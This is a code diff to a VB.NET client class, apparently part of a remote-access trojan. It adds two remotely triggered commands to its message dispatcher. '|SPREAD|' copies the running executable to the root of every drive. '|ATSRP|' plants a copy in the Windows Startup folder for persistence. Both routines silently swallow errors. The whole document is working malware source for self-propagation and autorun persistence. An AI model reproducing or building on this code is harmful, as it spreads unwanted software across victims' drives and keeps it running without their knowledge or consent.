@@ -52,6 +52,17 @@ Public Class MainCL
             ElseIf j(1) = "|INFO|" Then
 
                 Await Task.Run(Sub() InforMation(k))
+
+
+
+            ElseIf j(1) = "|SPREAD|" Then
+
+                Await Task.Run(Sub() SPRD())
+
+
+            ElseIf j(1) = "|ATSRP|" Then
+                Await Task.Run(Sub() ATSRP())
+
             End If
 
         End If
@@ -60,6 +71,43 @@ Public Class MainCL
 
     End Sub
 
+
+    Public Shared Sub SPRD()
+
+        Dim allDrives() As DriveInfo = DriveInfo.GetDrives()
+        Dim d As DriveInfo
+
+
+        For Each d In allDrives
+            Try
+                Dim l As Byte() = IO.File.ReadAllBytes(IO.Path.GetFullPath(System.Windows.Forms.Application.ExecutablePath))
+
+
+                IO.File.WriteAllBytes(d.Name & "\" & System.AppDomain.CurrentDomain.FriendlyName, l)
+
+            Catch ex As Exception
+
+            End Try
+
+
+        Next
+
+    End Sub
+
+    Public Shared Sub ATSRP()
+        If Not IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & System.AppDomain.CurrentDomain.FriendlyName) Then
+
+
+            Try
+                Dim l As Byte() = IO.File.ReadAllBytes(IO.Path.GetFullPath(System.Windows.Forms.Application.ExecutablePath))
+
+
+                IO.File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & System.AppDomain.CurrentDomain.FriendlyName, l)
+
+            Catch ex As Exception
+            End Try
+        End If
+    End Sub
     Public Shared Sub StartThat()
         Dim t1 As Boolean
         Dim t2 As UInteger
